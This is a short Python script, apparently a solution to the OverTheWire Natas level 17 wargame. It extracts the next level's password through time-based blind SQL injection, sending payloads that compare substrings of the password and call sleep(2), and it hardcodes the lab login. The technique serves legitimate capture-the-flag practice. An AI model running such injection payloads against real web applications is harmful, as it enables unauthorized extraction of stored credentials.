import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

u="http://natas17.natas.labs.overthewire.org/index.php?debug"

password="" # start with blank password
count = 1   # substr() length argument starts at 1
PASSWORD_LENGTH = 32  # previous passwords were 32 chars long
VALID_CHARS = string.digits + string.ascii_letters

while count <= PASSWORD_LENGTH + 1: 
    for c in VALID_CHARS: 
        payload=("username=natas18"
             "\" AND "
             "IF(BINARY substring(password,1," + str(count) + ") = '" +
             password + c + "', sleep(2), False)"
             " -- ")

        response = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=False) 

        # print(payload, " ------ ", response.elapsed) 
        
        if (response.elapsed.total_seconds() > 2):
            print("Found one more char : %s" % (password+c))
            password += c
            count = count + 1

print("Done!")
